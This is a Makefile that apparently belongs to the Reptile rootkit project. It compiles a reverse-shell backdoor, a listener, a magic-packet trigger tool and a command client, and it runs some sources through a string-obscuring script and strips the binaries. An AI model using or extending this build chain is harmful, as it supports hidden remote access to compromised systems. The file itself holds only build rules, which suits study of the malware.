CLIENT_OBJ=pel.c aes.c sha1.c listener.c
SERVER_OBJ=pel.c aes.c sha1.c #reverse.c

#all: listener reverse packet cmd

listener:
	gcc -O -W -Wall -o listener $(CLIENT_OBJ)
	strip listener
	cp listener ../bin

reverse:
	cat reverse.c | perl ../scripts/destringify.pl | gcc -O -W -Wall -o reverse $(SERVER_OBJ) -D_REPTILE_ -xc -lutil -
	#gcc -O -W -Wall -o reverse $(SERVER_OBJ) -lutil
	strip reverse
	cp reverse ../bin

standalone_reverse:
	cat reverse.c | perl ../scripts/destringify.pl | gcc -O -W -Wall -o reverse $(SERVER_OBJ) -xc -lutil -
	#gcc -O -W -Wall -o reverse $(SERVER_OBJ) -lutil
	strip reverse
	cp reverse ../bin

packet:
	gcc -O -W -Wall -o packet packet.c
	strip packet
	cp packet ../bin

cmd:
	cat cmd.c | perl ../scripts/destringify.pl | gcc -O -W -Wall -o cmd -xc -
	#gcc -O -W -Wall -o cmd cmd.c
	strip cmd
	cp cmd ../bin

client:
	gcc -O -W -Wall -o client client.c
	strip client
	cp client ../bin

clean:
	rm -f listener reverse packet cmd client config.h
